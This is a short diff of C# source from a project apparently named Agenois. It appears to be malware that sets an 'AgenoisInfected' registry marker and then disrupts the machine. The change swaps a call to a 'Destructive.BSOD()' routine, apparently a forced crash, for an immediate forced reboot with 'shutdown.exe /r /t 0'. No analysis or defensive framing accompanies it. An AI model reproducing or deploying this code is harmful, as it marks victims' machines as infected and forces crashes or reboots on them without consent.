@@ -190,7 +190,7 @@ namespace Agenois
                 editKey.SetValue("AgenoisInfected", "1");
                 editKey.Close();
 
-                Destructive.BSOD();
+                Others.StartProcess("shutdown.exe", "/r /t 0");
             }
             else
             {
